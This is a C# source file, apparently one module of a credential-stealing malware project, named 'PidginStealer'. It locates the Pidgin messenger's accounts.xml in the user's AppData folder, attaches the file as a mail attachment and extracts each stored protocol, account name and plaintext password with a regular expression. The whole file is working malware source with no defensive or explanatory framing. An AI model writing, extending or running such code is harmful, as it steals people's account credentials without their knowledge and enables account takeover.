using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Net.Mail;
using System.Text.RegularExpressions;
using sub.Util.Misc;

namespace sub.Stealers
{
    class PidginStealer : IStealer
    {
        private string _name = "PidginKeyStealer";

        public List<Attachment> Attachments { get; set; }

        public string Name
        {
            get { return _name; }
            set { _name = value; }
        }

        public string Data { get; set; }

        public void Collect()
        {
            string path =  Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\.purple\accounts.xml";
            if (File.Exists(path))
            {
                Attachments = new List<Attachment>();
                Attachments.Add(new Attachment(path));

                StreamReader reader = File.OpenText(path);
                string accountData = reader.ReadToEnd();
                reader.Close();
                Data = "";
                MatchCollection matchs =
                    new Regex("<protocol>(.*?)</password>",
                              RegexOptions.Singleline).Matches(accountData);
                string[] strArray = new string[matchs.Count];
                for (int i = 0; i < matchs.Count; i++)
                {
                    Data +=
                        matchs[i].Value.Replace("\t\t", "").Replace("<protocol>", "protocol: ").Replace("</protocol>", "").Replace(
                            "<name>", "name: ").Replace("</name>", "").Replace("<password>", "password: ").Replace("</password>", "") + "\r\n";
                }
            }

        }
    }
}
